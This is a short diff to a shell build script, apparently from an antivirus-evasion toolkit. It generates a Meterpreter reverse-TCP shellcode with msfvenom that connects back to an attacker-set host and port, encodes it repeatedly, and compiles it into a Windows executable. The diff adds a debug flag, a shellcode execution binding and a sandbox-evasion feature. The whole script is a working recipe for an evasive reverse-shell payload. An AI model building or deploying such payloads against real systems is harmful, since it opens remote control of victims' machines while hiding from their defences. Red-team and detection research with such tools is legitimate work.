@@ -17,13 +17,17 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
 
 # keep make_avet to at least get the shellcode input
-./make_avet -f sc.txt
+# request debug outputs via -p flag
+./make_avet -f sc.txt -p
 
 # import feature construction interface
 . build/feature_construction.sh
 
 # add fopen sandbox evasion feature
 add_feature fopen_sandbox_evasion
+
+# set shellcode binding technique
+shellcode_binding exec_shellcode
 
 # add gethostbyname killswitch evasion feature
 #append_value KVALUE localhost
